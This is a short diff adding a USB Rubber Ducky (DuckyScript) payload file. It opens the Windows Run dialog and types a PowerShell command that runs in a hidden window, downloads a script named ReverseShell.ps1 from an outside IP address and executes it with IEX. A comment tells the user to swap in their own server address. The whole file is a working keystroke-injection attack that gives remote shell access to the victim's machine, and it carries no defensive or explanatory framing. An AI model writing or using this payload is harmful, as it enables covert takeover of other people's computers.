@@ -1,0 +1,10 @@
+REM Opens Up Windows Run
+DELAY 100
+GUI r
+
+REM Opens up powershell in a hidden window where the payload is downloaded from the python web address
+REM Change the IP Address to your web server's address
+DELAY 100
+STRING powershell -w hidden "IEX (New-Object Net.WebClient).DownloadString('http://159.65.164.219/ReverseShell.ps1');"
+DELAY 50
+ENTER
